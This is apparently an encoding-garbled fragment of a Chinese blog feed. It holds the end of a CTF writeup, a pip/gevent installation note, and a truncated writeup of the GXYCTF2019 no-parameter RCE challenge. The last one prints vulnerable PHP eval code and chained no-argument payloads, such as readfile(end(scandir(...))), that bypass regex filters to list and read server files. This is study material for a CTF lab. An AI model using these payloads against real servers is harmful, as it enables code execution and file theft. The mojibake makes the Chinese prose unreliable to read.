class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå¾—åˆ°flag</p>
<hr>
<h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>æ–°å¢äº†é™ˆå¸ˆå‚…çš„å‹é“¾ï¼Œä»¥åä¹Ÿè¦å¤šæƒ³å¤§ä½¬å­¦ä¹ å­¦ä¹ <br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg" class="lazyload" title="test"></a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>å…³äºPython ç¬¬ä¸‰æ–¹åº“ Gevent å®‰è£…é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ³•</title>
    <url>/yakko117/2020/02/07/gevent/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>æœ€è¿‘æ‰¾åˆ°ä¸ª <code>TPscan</code> çš„è„šæœ¬å·¥å…·ï¼Œä½†æ˜¯ä¾èµ–åº“ç¼ºå¤±<br>æŒ‰ç€ç™¾åº¦çš„æ–¹æ³•è¯•äº†ä¸€å¤§å †éƒ½ä¸è¡Œï¼Œç„¶åè‡ªå·±æ‰¾ç‚¹å…¶ä»–çš„åŠæ³•æ¥è§£å†³</p>
<a id="more"></a>

<h1 id="pip-é‡åˆ°çš„é—®é¢˜"><a href="#pip-é‡åˆ°çš„é—®é¢˜" class="headerlink" title="pip é‡åˆ°çš„é—®é¢˜"></a>pip é‡åˆ°çš„é—®é¢˜</h1><h2 id="pipç‰ˆæœ¬å¤ªä½"><a href="#pipç‰ˆæœ¬å¤ªä½" class="headerlink" title="pipç‰ˆæœ¬å¤ªä½"></a>pipç‰ˆæœ¬å¤ªä½</h2><p>ä½¿ç”¨å‘½ä»¤ <code>pip install gevent</code> æ—¶ï¼Œ å›æ˜¾ </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You are using pip version 19.2.1, however version 20.0.2 is available</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªç®€å•ï¼Œé€šè¿‡å‡çº§ pip å¯ä»¥è§£å†³</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jo5ncj306o03mt8o.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jo5ncj306o03mt8o.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="è¶…æ—¶æŠ¥é”™-Read-timed-out"><a href="#è¶…æ—¶æŠ¥é”™-Read-timed-out" class="headerlink" title="è¶…æ—¶æŠ¥é”™ Read timed out"></a>è¶…æ—¶æŠ¥é”™ Read timed out</h2><p>è§£å†³äº† <code>pip</code> ç‰ˆæœ¬é—®é¢˜ä¹‹åï¼Œä½¿ç”¨ <code>pip</code> å®‰è£…ï¼Œ ç»“æœé£˜äº†ä¸€å¤§æ®µçº¢</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pip._vendor.requests.packages.urllib3.exceptions.ReadTimeoutError: HTTPSConnectionPool(host&#x3D;&#39;pypi.python.org&#39;, port&#x3D;443): Read timed out.</span><br></pre></td></tr></table></figure></div>

<p>ä¼šå‡ºç°ä¸Šè¿°é—®é¢˜ï¼Œä¸»è¦æ˜¯å› ä¸ºç½‘ç»œé—®é¢˜ï¼ŒPythonä¾èµ–åº“éƒ½æ˜¯å¤–ç½‘çš„ï¼Œå°¤å…¶æ˜¯ç¬¬ä¸‰æ–¹çš„è¿™ç§å°ä½œåŠäº§å“ï¼Œå›½å†…è®¿é—®é€Ÿåº¦å¤ªæ…¢ï¼Œä¸‹è½½é“¾æ¥æ—¶æ–­æ—¶ç»­ï¼Œçœ‹äº†ç½‘ä¸Šçš„å‡ ç§è§£å†³æ–¹æ³•ï¼Œæ•ˆæœéƒ½ä¸€èˆ¬</p>
<h3 id="æ–¹æ³•ä¸€-è®¾ç½®è¶…æ—¶æ—¶é—´"><a href="#æ–¹æ³•ä¸€-è®¾ç½®è¶…æ—¶æ—¶é—´" class="headerlink" title="æ–¹æ³•ä¸€ è®¾ç½®è¶…æ—¶æ—¶é—´"></a>æ–¹æ³•ä¸€ è®¾ç½®è¶…æ—¶æ—¶é—´</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip --default-timeout&#x3D;100 install -U gevent(å¯¹åº”çš„æ˜¯ä¾èµ–åŒ…æ¨¡å—çš„åç§°)</span><br></pre></td></tr></table></figure></div>

<p>æˆ–è€…</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install --default-timeout&#x3D;1000 --no-cache-dir -r requirements.txt</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå°±ä¼šå‘ç°ï¼Œè™½ç„¶ä¸ä¼šæŠ¥é”™äº†ï¼Œç»“æœä¹Ÿæ²¡æœ‰å…¶ä»–çš„å›æ˜¾äº†</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jpczej306o06o0sv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jpczej306o06o0sv.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="æ–¹æ³•äºŒ-pipæºæ›´æ¢"><a href="#æ–¹æ³•äºŒ-pipæºæ›´æ¢" class="headerlink" title="æ–¹æ³•äºŒ pipæºæ›´æ¢"></a>æ–¹æ³•äºŒ pipæºæ›´æ¢</h3><p>è¿™æ ·å°±èƒ½è§£å†³è¢«å¢™å¯¼è‡´çš„è£…ä¸ä¸Šåº“çš„çƒ¦æ¼ã€‚</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">è±†ç“£ï¼šhttp:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</span><br><span class="line"></span><br><span class="line">    æ¸…åï¼šhttps:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br></pre></td></tr></table></figure></div>

<p>é€šè¿‡ä½¿ç”¨æ¸…åæº çš„ç¡®ä¸‹è½½é€Ÿåº¦å¿«äº†ä¸å°‘</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple gevent</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jol3pj30ii04rt98.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jol3pj30ii04rt98.jpg" class="lazyload" title="test"></a></p>
<p>ä½†è¿˜æ˜¯å®‰è£…ä¸ä¸Šï¼Œç„¶åæˆ‘ç›´æ¥ä»æºä¸‹è½½äº† <code>gevent</code> åŒ…<br>å‘ç°<code>gevent 1.4.0</code> çš„ç‰ˆæœ¬åªæ”¯æŒ<code>python 3.7</code>çš„ç‰ˆæœ¬ï¼Œæˆ‘çš„æ˜¯<code>python3.8</code> 32ä½çš„</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jnj5pj306o053gll.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jnj5pj306o053gll.jpg" class="lazyload" title="test"></a></p>
<p><strong>ä¸€å®šè¦æ³¨æ„ç‰ˆæœ¬ï¼ æ³¨æ„ç‰ˆæœ¬ï¼ æ³¨æ„ç‰ˆæœ¬ï¼</strong></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6joytoj309509nglm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6joytoj309509nglm.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åç½‘ä¸Šæ‰¾åˆ°äº†é€‚åˆ3.8ç‰ˆæœ¬çš„ <code>gevent-1.5a3-cp38-cp38-win32.whl</code></p>
<p>ç„¶åç»è¿‡æ¼«é•¿çš„ç­‰å¾…å®‰è£…ï¼Œç»ˆäºå¥½äº†</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jqgiej30tk0bytg3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jqgiej30tk0bytg3.jpg" class="lazyload" title="test"></a></p>
<p>ç„¶åå°è¯•è·‘ä¸€éï¼Œå¯è¡Œï¼Œå°±å¾ˆèˆ’æœ</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jrc7dj309f06xt8l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jrc7dj309f06xt8l.jpg" class="lazyload" title="test"></a></p>
<hr>
<h1 id="ä¾èµ–åŒ…é—®é¢˜"><a href="#ä¾èµ–åŒ…é—®é¢˜" class="headerlink" title="ä¾èµ–åŒ…é—®é¢˜"></a>ä¾èµ–åŒ…é—®é¢˜</h1><p>ç„¶åé™¤äº†ä¸Šè¿°é—®é¢˜ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–ä¾èµ–åŒ…é—®é¢˜<br>å¦‚æœè¦ç”¨ <code>gevent</code> åšç½‘ç»œå·¥ç¨‹<br>éœ€è¦æ·»åŠ å…¶ä»–ä¾èµ–åŒ…</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple greenlet</span><br><span class="line"></span><br><span class="line">pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple libevent</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>çæ‰¯</tag>
      </tags>
  </entry>
  <entry>
    <title>é€šè¿‡ä¸€é“é¢˜å­¦ä¹ æ— å‚æ•°RCE</title>
    <url>/yakko117/2020/02/05/GXY%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>é¢˜ç›®æ˜¯ <a href="https://buuoj.cn/challenges#[GXYCTF2019]%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83" target="_blank" rel="noopener">[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</a><br>æ­£å¥½å€Ÿæ­¤æ¥å­¦ä¹ ä¸€ä¸‹æ–°çŸ¥è¯†</p>
<a id="more"></a>

<h1 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h1><p>å®˜æ–¹ç»™çš„ <strong>Hint:</strong> <code>GitHack äº†è§£ä¸€ä¸‹</code><br>è¡Œå§ï¼Œé‚£å°±å»æ‹¿æºç  (å°å£°bbè‡ªå·±çš„å­—å…¸å¤ªåƒåœ¾äº†ï¼Œæ²¡è·‘å‡ºæ¥)</p>
<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>çœ‹ä¸‹æ­£åˆ™åŒ¹é…ï¼Œ<code>(?R)</code> æ„å‘³å¼•ç”¨æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼<br><code>æ˜¯å¼•ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œè€Œä¸æ˜¯å¼•ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…åˆ°çš„ç»“æœ</code><br>åé¢åŠ äº† <code>?</code> è¿›è¡Œé€’å½’è°ƒç”¨ã€‚<br>å› æ­¤åªèƒ½åŒ¹é…é€šè¿‡æ— å‚æ•°çš„å‡½æ•°</p>
<hr>
<h2 id="é¦–å…ˆå¾—å…ˆçŸ¥é“äº›ä¸œä¸œ"><a href="#é¦–å…ˆå¾—å…ˆçŸ¥é“äº›ä¸œä¸œ" class="headerlink" title="é¦–å…ˆå¾—å…ˆçŸ¥é“äº›ä¸œä¸œ"></a>é¦–å…ˆå¾—å…ˆçŸ¥é“äº›ä¸œä¸œ</h2><p>å‡å¦‚å­˜åœ¨ä»¥ä¸‹ä¸€å¥è¯</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br></pre></td></tr></table></figure></div>

<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥ <code>getshell</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lvmk3j30c70gp78v.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lvmk3j30c70gp78v.jpg" class="lazyload" title="test"></a></p>
<p>ä½†æ˜¯å¦‚æœå­˜åœ¨ä»¥ä¸‹é™åˆ¶</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬ä½¿ç”¨å‚æ•°åˆ™æ— æ³•é€šè¿‡æ­£åˆ™çš„æ ¡éªŒ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/[^\W]+\((?R)?\)/</span><br></pre></td></tr></table></figure></div>

<p>è¿™ç§æ­£åˆ™ï¼Œå°±æ˜¯æˆ‘ä»¬è¯´çš„æ— å‚æ•°å‡½æ•°çš„æ ¡éªŒ<br>å…¶åªå…è®¸æ‰§è¡Œç±»ä¼¼ä¸‹é¢è¿™ç§æ ¼å¼å‡½æ•°ï¼Œ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A(B(C()));</span><br><span class="line">A();</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">ä½†æ˜¯ä¸å…è®¸è¿›è¡Œå‚æ•°æ·»åŠ ï¼š</span><br><span class="line">A(&#39;123&#39;);</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="å¦‚ä½•å¾—åˆ°-flag-php-æ–‡ä»¶å"><a href="#å¦‚ä½•å¾—åˆ°-flag-php-æ–‡ä»¶å" class="headerlink" title="å¦‚ä½•å¾—åˆ° flag.php æ–‡ä»¶å"></a>å¦‚ä½•å¾—åˆ° flag.php æ–‡ä»¶å</h2><p>é€šè¿‡æ‹œè¯»é£˜é›¶å¸ˆå‚…çš„æ–‡ç« ï¼ŒçŸ¥é“äº†å¯ä»¥åˆ©ç”¨ <code>getallheaders()</code> æ‹¿åˆ°ç¯å¢ƒå˜é‡<br>ä½¿è‡ªå·±ä¼ å‚çš„å‚æ•°å˜ä¸ºå¯æ§çš„ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>ä¹Ÿå¯ä»¥åˆ©ç”¨å¸¸è§„æ–¹æ³•ï¼Œä»æ‰¾ä¸ªå‡½æ•°æ¥è¿”å› <code>flag.php</code> æ–‡ä»¶å<br><code>scandir()</code> å‡½æ•°å¯ä»¥æ‰«æå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> print_r(scandir(<span class="string">'.'</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>æŒ‰ç…§é£˜é›¶å¸ˆå‚…çš„æ€è·¯ï¼Œåˆ©ç”¨ <code>getcwd()</code> è·å¾—å½“å‰ç›®å½•ï¼Œ<code>scandir(getcwd())</code> è·å¾—å½“å‰ç›®å½•çš„æ–‡ä»¶ã€‚<br>è€Œå¦‚æœè¦å¾€ä¸Šå±‚ç›®å½•çœ‹çš„è¯ï¼Œå°±åˆ©ç”¨<code>dirname()</code>ï¼Œä½¿ç”¨<code>scandir(dirname(getcwd()))</code>ã€‚<br>ä½†æ˜¯è¿™é‡Œçš„ <code>et</code> è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰¾å…¶ä»–çš„æ–¹æ³•</p>
<p>å› æ­¤ <code>scandir</code> çš„ <code>.</code>  å¦‚ä½•åˆ©ç”¨æˆäº†é—®é¢˜</p>
<h3 id="é€šè¿‡åˆ©ç”¨-current-localeconv"><a href="#é€šè¿‡åˆ©ç”¨-current-localeconv" class="headerlink" title="é€šè¿‡åˆ©ç”¨ current(localeconv())"></a>é€šè¿‡åˆ©ç”¨ current(localeconv())</h3><p><code>localeconv()</code> å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   print_r(localeconv());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lv9buj30n90asaay.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1lv9buj30n90asaay.jpg" class="lazyload" title="test"></a></p>
<p><code>current(localeconv())</code> æ°¸è¿œéƒ½æ˜¯ä¸ªç‚¹</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   print_r(current(localeconv()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>ç”±äºphpæ•°ç»„å†…éƒ¨æŒ‡é’ˆé»˜è®¤æŒ‡å‘ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ‰€ä»¥ <code>current()</code> æˆ– <code>pos()</code> å–æ•°ç»„ä¸­å½“å‰å…ƒç´ çš„å€¼<br>é€šè¿‡ä¸Šå›¾å¯çŸ¥ï¼Œå­—ç¬¦ä¸²é¦–ä½ä¸º <code>.</code>ï¼Œç»“åˆæ›¾ç»åˆ†æçš„ <a href="https://www.suk1.top/2019/01/22/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">php å¼±ç±»å‹</a>ï¼Œå¯ä»¥çŸ¥é“æ•°ç»„å­—ç¬¦ä¸²æ”¹æˆæµ®ç‚¹å‹åˆ¤å®šï¼Œä»¥æ­¤æ„é€ å‡½æ•°åˆ©ç”¨ï¼Œå¾—åˆ°æœ€ç»ˆæ‰€æœŸæœ›å¾—åˆ°çš„ <code>.</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1ltceej30eo07y3yl.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbll1ltceej30eo07y3yl.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="é€šè¿‡åˆ©ç”¨-phpversion-è¿›è¡Œæ— å‚æ•°å‡½æ•°åˆ©ç”¨"><a href="#é€šè¿‡åˆ©ç”¨-phpversion-è¿›è¡Œæ— å‚æ•°å‡½æ•°åˆ©ç”¨" class="headerlink" title="é€šè¿‡åˆ©ç”¨ phpversion() è¿›è¡Œæ— å‚æ•°å‡½æ•°åˆ©ç”¨"></a>é€šè¿‡åˆ©ç”¨ phpversion() è¿›è¡Œæ— å‚æ•°å‡½æ•°åˆ©ç”¨</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šé¢è¿™ä¸ªå‘½ä»¤æ‰§è¡Œä¹Ÿå¯ä»¥éå†å½“å‰ç›®å½•ï¼Œä¸‹é¢çš„æ˜¯åœ¨æœ¬åœ°æ­äº†ç¯å¢ƒæµ‹è¯•çš„ä¸åŒå‡½æ•°å›æ˜¾ç»“æœ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">phpversion()   å›æ˜¾ string(11) "7.3.10-1+b1"</span><br><span class="line">floor(phpversion())   å›æ˜¾ float(7) </span><br><span class="line">sqrt(floor(phpversion()))  å›æ˜¾ float(2.6457513110646) </span><br><span class="line">tan(floor(sqrt(floor(phpversion())))) å›æ˜¾ float(-2.1850398632615) </span><br><span class="line">cosh(tan(floor(sqrt(floor(phpversion()))))) è¿”å›4.5017381103491</span><br><span class="line">sinh(cosh(tan(floor(sqrt(floor(phpversion())))))) è¿”å›45.081318677156</span><br><span class="line"></span><br><span class="line">ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</span><br><span class="line">å›æ˜¾ 46</span><br><span class="line"></span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</span><br><span class="line">å›æ˜¾ string(1) "." </span><br><span class="line"></span><br><span class="line">next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</span><br><span class="line">å›æ˜¾ string(2) ".." </span><br><span class="line"></span><br><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))))  è¿™ä¸ªæ²¡æœ‰</span><br><span class="line"></span><br><span class="line">chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))</span><br><span class="line">å›æ˜¾ bool(true) </span><br><span class="line"></span><br><span class="line">readfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))); è¿™ä¸ªæ²¡æµ‹å‡ºæ¥ï¼Œå¤§ä½¬è¯´æ˜¯ä¸‹é¢è¿™ç§æƒ…å†µ</span><br><span class="line">hebrevc(crypt(arg))å¯ä»¥éšæœºç”Ÿæˆä¸€ä¸ªhashå€¼ ç¬¬ä¸€ä¸ªå­—ç¬¦éšæœºæ˜¯ $(å¤§æ¦‚ç‡) æˆ–è€… .(å°æ¦‚ç‡) ç„¶åé€šè¿‡ord chråªå–ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line"></span><br><span class="line">readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br><span class="line">å›æ˜¾äº†indexçš„æºç </span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="å¦‚ä½•å¾—åˆ°flag-php"><a href="#å¦‚ä½•å¾—åˆ°flag-php" class="headerlink" title="å¦‚ä½•å¾—åˆ°flag.php"></a>å¦‚ä½•å¾—åˆ°flag.php</h2><p>å¦‚ä¸Šï¼Œå…ˆåˆ©ç”¨ <code>current(localeconv())</code> å¾—åˆ°å½“å‰ç›®å½•</p>
